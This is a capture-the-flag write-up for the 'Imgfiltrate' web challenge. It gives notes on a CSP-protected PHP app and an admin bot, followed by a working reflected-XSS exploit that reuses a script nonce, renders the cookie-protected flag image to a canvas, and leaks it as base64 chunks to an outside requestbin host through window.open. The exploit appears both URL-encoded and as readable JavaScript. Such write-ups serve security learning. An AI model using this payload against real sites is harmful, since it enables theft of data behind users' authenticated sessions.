# Imgfiltrate

Can you yoink an image from the admin page?
> Hint: the cookie is set up for internal hostname of imgfiltrate.hub which the
> admin needs to use.

App: http://35.224.135.84:3200
Admin bot: http://35.224.135.84:3201



# Notes

## App
### /index.php
- Sets CSP to `default-src 'none'; img-src 'self'; script-src 'nonce-RANDVALUE';`
  - via CSP checker, base-uri is missing so we can inject <base> tags to mess
    with relative URLs if we can XSS
- Puts GET param of `name` on the page. This allows us to inject content.

### /flag.php
- Checks if cookie is set to TOKEN and if so, returns flag png

## Bot
### POST /visit { url: 'https://...' }
- Rate limits to 5/min
- Sets TOKEN cookie with sameSite strict and httpOnly true


# Attack Plan

- Tell bot to visit home page with injected XSS
- Exfil image value somehow lol (XSS-payloads.com?)
  Attempted exfil via iframe but SameSite breaks this

# Exploit


XSS PoC: http://35.224.135.84:3200?/?name=<script+nonce%3d70861e83ad7f1863b3020799df93e450>alert('xss')</script>
Exfill Exploit: http://imgfiltrate.hub/?name=%3cscript%20nonce%3d70861e83ad7f1863b3020799df93e450%3evar%20ex%20%3d%20function(b64)%20%7b%20var%20i%20%3d%200%3b%20var%20y%20%3d%200%3b%20var%20urls%20%3d%20%5b%5d%3b%20while(i%20%3c%20b64.length)%20%7b%20urls.push('https%3a%2f%2fenaq7r3pd5yua.x.pipedream.net%2f'%2by%2b'%2f'%2bb64.slice(i%2c%20i%2b1750))%3b%20i%2b%3d1750%3by%2b%2b%3b%7d%20urls.forEach(window.open)%3b%7d%3b%20var%20i%20%3d%20new%20Image()%3bi.onload%20%3d%20function()%7bvar%20c%3ddocument.createElement('canvas')%3bc.width%3di.width%3bc.height%3di.height%3bvar%20ctx%3dc.getContext('2d')%3bctx.drawImage(i%2c0%2c0)%3bvar%20b64%3dc.toDataURL('image%2fpng')%3bex(b64)%3b%7d%3bi.src%3d'http%3a%2f%2fimgfiltrate.hub%2fflag.php'%3b%3c%2fscript%3e
^ admin goes here

Manually combine base64 strings in CyberChef with RenderImage to get the image

This is full JS
```html
<script nonce=70861e83ad7f1863b3020799df93e450>
// Exfil function, window.open doesn't care about CSP
// We add the index into the URL since requestbin doesn't maintain consistent
// order so we need to pass that info over. 1750 is arbitrary but <2000 (general URL limit)
var ex = function(b64) { 
  var i = 0; var y = 0; var urls = []; 
  while(i < b64.length) { 
    urls.push('https://enaq7r3pd5yua.x.pipedream.net/'+y+'/'+b64.slice(i, i+1750)); 
    i+=1750;
    y++;
  } 
  urls.forEach(window.open);
}; 
var i = new Image();
i.onload = function(){
  var c=document.createElement('canvas');
  c.width=i.width;
  c.height=i.height;
  var ctx=c.getContext('2d');
  ctx.drawImage(i,0,0);
  var b64=c.toDataURL('image/png');
  ex(b64);
};
i.src='http://imgfiltrate.hub/flag.php';
</script>
```


<!-- https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-same-site-00 -->
<!-- particularly document-bassed requests description of origin, sandboxing may work -->
